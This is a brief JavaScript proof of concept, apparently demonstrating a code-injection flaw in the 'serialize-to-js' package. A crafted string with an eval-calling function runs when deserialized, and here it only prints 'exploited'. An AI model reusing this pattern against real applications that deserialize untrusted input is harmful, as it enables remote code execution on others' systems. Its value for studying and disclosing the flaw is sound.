var payload = "{e: (function(){ eval('console.log(`exploited`)') })() }"
var serialize = require('serialize-to-js');
var des = serialize.deserialize(payload);
console.log(des);